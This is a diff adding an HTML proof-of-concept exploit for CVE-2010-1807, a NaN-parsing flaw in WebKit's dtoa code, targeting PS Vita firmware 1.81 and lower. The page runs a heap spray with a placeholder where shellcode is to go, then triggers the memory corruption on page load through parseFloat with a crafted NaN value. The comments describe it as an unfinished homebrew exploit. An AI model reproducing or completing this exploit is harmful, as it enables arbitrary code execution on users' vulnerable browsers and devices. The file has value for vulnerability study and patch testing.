@@ -1,0 +1,49 @@
+<!--
+Comments here
+-->
+<html>
+<head>
+<script>
+// CVE-2010-1807
+// Takes advantage of an issue in dtoa.cpp allowing us to specify an external non-standard NaN for parsing, it is not properly validated and crashes.
+//
+// Vita target is 1.81 and lower.
+//
+// Beginning of reduction attempt, want to call this "Bad Nanna" once I had worked out payload and adapted to work with dumper.
+// Became 'irrelevant' once work began on higher firmware version. Others have also taken advantage of this privately and I assume will release soon.
+
+
+function sploit(pop)
+        {
+        var span = document.createElement("div");
+        document.getElementById("go").appendChild(span);
+        span.innerHTML = pop;
+        }
+		
+function heap()
+        {       
+        var scode = unescape("\ufeca\ubeba") // add shellcode here
+        do {
+          scode += scode;
+        } while(scode.length < 0x1000);
+        target = new Array();
+        for(i = 0; i < 1000; i++)
+           target[i] = scode;
+        for (i = 0; i <= 1000; i++)
+        {
+                if (i>999)
+        {
+        sploit(-parseFloat("NAN(ffffe00572c60)")); //trigger use-after-free
+        }
+        //document.write("" + target[i]);
+        }
+}
+</script>
+</head>
+<body id="go">
+la dolce vita
+<script>
+heap();
+</script>
+</body>
+</html>
